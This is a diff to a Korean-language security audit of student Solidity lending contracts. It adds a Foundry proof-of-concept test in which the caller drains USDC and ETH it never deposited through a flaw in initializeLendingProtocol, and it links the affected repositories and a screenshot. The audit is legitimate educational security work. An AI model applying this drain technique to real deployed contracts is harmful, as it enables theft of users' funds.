@@ -5,6 +5,29 @@
 
 실제로는 address(0x0) 의 reserve만 보냈더라도 잔고에는 _depositUSDC까지 올라가는 결과가 발생하여, withdraw함수에서 인출 가능합니다.
 
+```
+function testWithdrawAtt() external {
+    dreamOracle.setPrice(address(0x0), 1 ether);
+    dreamOracle.setPrice(address(usdc), 1 ether);
+
+    usdc.transfer(address(lending), 1000 ether);
+    lending.initializeLendingProtocol{value: 1000 ether}(address(usdc));
+
+    // 강제로 0으로 만듬.
+    vm.deal(address(this), 0 ether);
+    usdc.transfer(user1, usdc.balanceOf(address(this)));
+
+    console.log("before withdraw eth: %d", address(this).balance);
+    console.log("before withdraw usdc: %d", usdc.balanceOf(address(this)));
+
+    lending.withdraw(address(usdc), 1000 ether);
+    lending.withdraw(address(0x0), 1000 ether);
+
+    console.log("after withdraw eth: %d", address(this).balance);
+    console.log("after withdraw usdc: %d", usdc.balanceOf(address(this)));
+}
+```
+
 ### 파급력
 심각도는 Critical로써 사용자는 ether 혹은 usdc만 initializeLendingProtocol함수를 통해 실제 예치하지 않은 컨트랙트 내의 다른 토큰을 withdraw 할 수 있게되거나 borrow를 통해 비정상적으로 다른 토큰을 빌려갈 수 있습니다.
 
@@ -15,6 +38,10 @@
 * [dlanaraa/Lending_solidity](https://github.com/dlanaraa/Lending_solidity/blob/55071b255a24d87517629b1d37672bc4ab580acc/src/DreamAcademyLending.sol#L127-L128)
 * [seonghwi-lee/Lending](https://github.com/seonghwi-lee/Lending/blob/9f93e626f86beb865f0eec63a68dd4f18a4686f7/src/DreamAcademyLending.sol#L44)
 * [jun4n/Lending_solidity](https://github.com/jun4n/Lending_solidity/blob/fd3baab9a9c6384e6dfb767c23ce2f81cc1de913/src/DreamAcademyLending.sol#L125)
+
+### 스크린샷
+<img width="560" alt="image" src="https://user-images.githubusercontent.com/127647300/228133955-fbd62f72-eae3-49dc-a64f-29262483ba8e.png">
+
 
 ## 2. withdraw에서 call 사용하여 ether 반환할때 re-entrancy 취약점
 
